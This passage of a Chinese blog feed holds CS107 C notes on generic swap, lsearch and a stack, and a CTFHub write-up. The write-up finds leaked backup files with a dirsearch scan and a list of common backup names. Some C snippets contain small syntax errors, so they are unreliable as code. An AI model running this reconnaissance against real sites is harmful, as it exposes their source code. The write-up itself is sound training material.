punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span>vp1<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 和 strcpy 很像，但它不会检测 \\0，所以需要人为设置需要拷贝的字节大小</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>vp1<span class=\"token punctuation\">,</span>vp2<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>vp2<span class=\"token punctuation\">,</span>buffer<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">int</span> x <span class=\"token operator\">=</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> y <span class=\"token operator\">=</span> <span class=\"token number\">37</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>x<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>y<span class=\"token punctuation\">,</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>现在假设我们有以下变量</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>husband <span class=\"token operator\">=</span> <span class=\"token function\">strdup</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Fred\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>wife <span class=\"token operator\">=</span> <span class=\"token function\">strdup</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wilma\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"image-20231103184829084.png\" alt=\"image-20231103184829084\"></p>\n<p>如果我们想将 husband 和 wife 的名字调换一下，我们实际上只需要将其所指的指针调换即可，使 husband 指向 wilma，使 wife 指向 Fred。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>husband<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>wife<span class=\"token punctuation\">,</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \t<span class=\"token comment\">// 这里需要取地址，因为我们实际上交换的就是 h 和 w 所指向的内容，当我们想要交换两\t\t\t\t\t\t\t\t\t\t// 个 int 变量时，我们传入的时 int *，那么我们想要交换两个 char * 变量时，应该\t\t\t\t\t\t\t\t\t\t  // 传入的是 char **</span></pre></td></tr></table></figure><p>但是如果你忘记加 &amp;，程序仍然会编译并运行</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">swap</span><span class=\"token punctuation\">(</span>husband<span class=\"token punctuation\">,</span>wife<span class=\"token punctuation\">,</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这样最终结果会直接改变两个字符串的值，分别为 wilm 和 Freda。</p>\n<h2 id=\"例子\"><a class=\"markdownIt-Anchor\" href=\"#例子\">#</a> 例子</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">lsearch</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> key<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> array<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>size<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>key<span class=\"token punctuation\">)</span>   <span class=\"token comment\">// 这一步在位的层面上比较是的 4 个字节是否相等</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>如果我们想让这个函数泛化，不只是查找一个 int 类型的 key，就需要多加一些参数。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token function\">lsearch</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>key<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>base<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> elemSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>n<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elemAddr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>base <span class=\"token operator\">+</span> i<span class=\"token operator\">*</span>elemSize<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 这里将 void * 类型转换成 char * 类型，以便编译器能进行运算</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">memcmp</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span>elemAddr<span class=\"token punctuation\">,</span>elemSize<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token keyword\">return</span> elemAddr<span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 在内存层面，一个字节一个字节进行比较</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>上述方法使用的是系统提供的比较函数，在下次课程中，将会使用下面的代码，在变量中加入了比较函数的指针 *cmpfn 来完成 memcmp 函数的功能。</p>\n<pre><code>void *lsearch(void *key, void *base,int n,int elemSize,int (*cmpfn)(void *,void *))&#123;\n\n&#125;\n</code></pre>\n",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/05/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_5/",
            "url": "http://yanagi-kon.github.io/2023/11/05/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_5/",
            "title": "斯坦福编程范式CS107_5",
            "date_published": "2023-11-05T12:28:00.000Z",
            "content_html": "<h1 id=\"斯坦福编程范式cs107_5\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_5\">#</a> 斯坦福编程范式 CS107_5</h1>\n<h2 id=\"接着上节课的例子\"><a class=\"markdownIt-Anchor\" href=\"#接着上节课的例子\">#</a> 接着上节课的例子</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token function\">lsearch</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>key<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>base<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> elemSize<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>cmpfn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>n<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elemAddr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>base <span class=\"token operator\">+</span> i <span class=\"token operator\">*</span> elemSize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">cmpfn</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span>elemAddr<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">//cmpfn 函数就是比较传入的地址中的内容是否一样</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">return</span> elemAddr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>下面是一个使用上述函数的例子</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> array<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> size <span class=\"token operator\">=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> number <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>found <span class=\"token operator\">=</span> <span class=\"token function\">lsearch</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>number<span class=\"token punctuation\">,</span>array<span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>IntCmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">//IntCmp 是用来比较的函数，之后再进行实现</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">IntCmp</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elem1<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>elem2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>ip1 <span class=\"token operator\">=</span> elem1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>ip2 <span class=\"token operator\">=</span> elem2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token operator\">*</span>ip1 <span class=\"token operator\">-</span> <span class=\"token operator\">*</span>ip2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>我们再来举一个如果数组是字符串的例子</p>\n<p><img data-src=\"image-20231104095657611.png\" alt=\"image-20231104095657611\"></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span> notes<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"Ab\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"F#\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"B\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"Gb\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"D\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>favoriteNote <span class=\"token operator\">=</span> <span class=\"token string\">\"Eb\"</span><span class=\"token punctuation\">;</span>\\</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>found <span class=\"token operator\">=</span> <span class=\"token function\">lsearch</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>favoriteNote<span class=\"token punctuation\">,</span>notes<span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>StrCmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">//&amp;favoriteNote 是一个 char **</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">StrCmp</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>vp1<span class=\"token punctuation\">,</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>vp2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s1 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>vp1<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 强制转换为 char ** 再对其解引用</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s2 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>vp2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span>s1<span class=\"token punctuation\">,</span>s2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">//clib 中自带的一个字符一个字符的比较</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>上述例子中，为何不直接将 vp 强制转换为 char * 类型的呢？因为我们的 notes 数组实际上相当于 char**，于是我们知道实际上 vp 与我们的字符串 &quot;Ab&quot; 之类的有两跳的距离，对 vp 解一次引用我们能得到的是指向字符串的首地址，再解一次引用得到的是字符串的首字符。strcmp 函数需要的是字符串的首地址，所以我们对 vp 强制转换为 char**，再解一次引用即可。如果直接使用 (char*) vp1，系统就会误把存储着字符串的地址认为是字符串，所以不能够直接强制转换为 char*。</p>\n<p>favoriteNote 是一个 char * 类型的变量，&amp;favoriteNote 是一个 char ** 类型的变量，当然也可以传入 favoriteNote，但是这样就破坏了函数变量处理的对称性，因为在之后的处理中，我们的 vp 都是 char ** 进行处理的，而 favoriteNote 按 char * 进行处理。</p>\n<h2 id=\"实现一个栈stackh\"><a class=\"markdownIt-Anchor\" href=\"#实现一个栈stackh\">#</a> 实现一个栈 Stack.h</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>elems<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> logicalLen<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 已经使用的内存</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> alloclength<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 申请的内存大小</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span>stack<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackNew</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackDispose</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackPush</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">StackPop</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>上述的结构是 12 字节的，并且都是隐式的 public，但是我们要将其当作黑盒来处理，使用外在的函数对结构进行操作。</p>\n<p>当执行下面代码时，c 会为你保留一部分内存空间，但不会像 java 那样将内存空间清 0。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>stack s<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"image-20231104105236562.png\" alt=\"image-20231104105236562\"></p>\n<p>假设，当我们使用 StackNew (&amp;s); 时，系统会预申请一个能存入 4 个 int 的大小空间，这时进行任何操作都是非常迅速的，因为空间已经提前申请好了；当存入的数超过 4 个时，系统会再申请一个翻倍的空间，并把原先空间中的内容搬过来，原先空间删除。</p>\n<p>下面实现一部分内容：</p>\n<p><code>s</code>  是一个局部变量，它假设的是它指向的是一个 12 字节的内存空间，并且内容未知。</p>\n<p><img data-src=\"image-20231104110715544.png\" alt=\"image-20231104110715544\"></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackNew</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    s<span class=\"token operator\">-></span>logicallen <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    s<span class=\"token operator\">-></span>allocLen <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    s<span class=\"token operator\">-></span>elems <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 动态分配内存函数，返回这一大块内存地址的开始地址</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>elems <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 如果 assert 里面的内容为 false，assert 会终止程序，并告知终止位置</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/30/WEB%20%E5%AD%A6%E4%B9%A0%202023.10.23/",
            "url": "http://yanagi-kon.github.io/2023/10/30/WEB%20%E5%AD%A6%E4%B9%A0%202023.10.23/",
            "title": "WEB 学习 2023.10.23",
            "date_published": "2023-10-30T04:24:13.000Z",
            "content_html": "<h1 id=\"web-学习-20231023\"><a class=\"markdownIt-Anchor\" href=\"#web-学习-20231023\">#</a> WEB 学习 2023.10.23</h1>\n<h1 id=\"信息泄露\"><a class=\"markdownIt-Anchor\" href=\"#信息泄露\">#</a> 信息泄露</h1>\n<h2 id=\"备份文件下载\"><a class=\"markdownIt-Anchor\" href=\"#备份文件下载\">#</a> 备份文件下载</h2>\n<h3 id=\"phpinfo\"><a class=\"markdownIt-Anchor\" href=\"#phpinfo\">#</a> PHPINFO</h3>\n<p>打开环境直接浏览器搜索 ctf 即可找到对应的 flag：</p>\n<p><img data-src=\"image-20231023102957376.png\" alt=\"image-20231023102957376\"></p>\n<p><code>ctfhub&#123;5deb0c24242cf420fed9cfa1&#125;</code></p>\n<h3 id=\"网站源码\"><a class=\"markdownIt-Anchor\" href=\"#网站源码\">#</a> 网站源码</h3>\n<p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>\n<h4 id=\"0x01-提示\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示\">#</a> 0x01 提示</h4>\n<p><strong>常见的网站源码备份文件后缀</strong></p>\n<hr>\n<ul>\n<li>tar</li>\n<li>tar.gz</li>\n<li>zip</li>\n<li>rar</li>\n</ul>\n<p><strong>常见的网站源码备份文件名</strong></p>\n<hr>\n<ul>\n<li>web</li>\n<li>website</li>\n<li>backup</li>\n<li>back</li>\n<li>www</li>\n<li>wwwroot</li>\n<li>temp</li>\n</ul>\n<h4 id=\"0x02-使用-dirsearch-查找\"><a class=\"markdownIt-Anchor\" href=\"#0x02-使用-dirsearch-查找\">#</a> 0x02 使用 dirsearch 查找</h4>\n<p>使用以下命令：</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dirsearch <span class=\"token parameter variable\">-u</span> http://challenge-c3d0a76d9273c7c1.sandbox.ctfhub.com:10800/</pre></td></tr></table></figure><p>可得：</p>\n<p><img data-src=\"image-20231023103710014.png\" alt=\"image-20231023103710014\"></p>\n<p>直接下载文件 www.zip 并进行解压：</p>\n<p><img data-src=\"image-20231023104034805.png\" alt=\"image-20231023104034805\"></p>\n<h4 id=\"0x03-二次隐藏\"><a class=\"markdownIt-Anchor\" href=\"#0x03-二次隐藏\">#</a> 0x03 二次隐藏</h4>\n<p>得到一个名为  <code>flag_33496031.txt</code>  的文件，打开之后并没有 flag，重新在网站中查找相关信息：</p>\n<figure class=\"highlight url\"><figcaption data-lang=\"url\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token scheme\">http<span class=\"token scheme-delimiter\">:</span></span><span class=\"token authority\"><span class=\"token authority-delimiter\">//</span><span class=\"token host\">challenge-c3d0a76d9273c7c1.sandbox.ctfhub.com</span><span class=\"token port-segment\"><span class=\"token port-delimiter\">:</span><span class=\"token port\">10800</span></span></span><span class=\"token path\"><span class=\"token path-separator\">/</span>flag_33496031.txt</span></pre></td></tr></table></figure><p><img data-src=\"image-20231023104442099.png\" alt=\"image-20231023104442099\"></p>\n<p>得到 flag： <code>ctfhub&#123;77f725d5968d87ba19a72640&#125;</code></p>\n<h3 id=\"bak文件\"><a class=\"markdownIt-Anchor\" href=\"#bak文件\">#</a> bak 文件</h3>\n<h4 id=\"0x01-提示-2\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-2\">#</a> 0x01 提示</h4>\n<p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>\n<h4 id=\"0x02-题目\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目\">#</a> 0x02 题目</h4>\n<p><img data-src=\"image-20231023105433198.png\" alt=\"image-20231023105433198\"></p>\n<h4 id=\"0x03-使用-dirsearch-进行查找\"><a class=\"markdownIt-Anchor\" href=\"#0x03-使用-dirsearch-进行查找\">#</a> 0x03 使用 dirsearch 进行查找：</h4>\n<p><img data-src=\"image-20231023105420938.png\" alt=\"image-20231023105420938\"></p>\n<p>找到了一个 bak 文件，进行下载，使用记事本打开，即可获得 flag</p>\n<p><img data-src=\"image-20231023105614392.png\" alt=\"image-20231023105614392\"></p>\n<p><code>ctfhub&#123;93f00169cf75b69bd006441b&#125;</code></p>\n<h3 id=\"vim缓存\"><a class=\"markdownIt-Anchor\" 